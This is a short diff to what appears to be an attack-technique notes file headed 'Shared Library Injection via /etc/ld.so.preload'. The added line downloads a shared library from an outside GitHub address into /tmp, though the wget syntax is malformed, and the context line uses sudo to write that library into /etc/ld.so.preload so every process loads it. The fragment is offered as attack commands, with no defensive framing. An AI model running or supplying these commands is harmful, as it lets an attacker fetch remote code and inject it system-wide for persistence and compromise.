@@ -1,3 +1,6 @@
+  
+ wget -P /tmp/https://github.com/jage1nf/testlib/blob/main/inject_lib.so  
+  
 1. Shared Library Injection via /etc/ld.so.preload  
 Attack Commands:  
 sudo sh -c 'echo /tmp/inject_lib.so > /etc/ld.so.preload'  
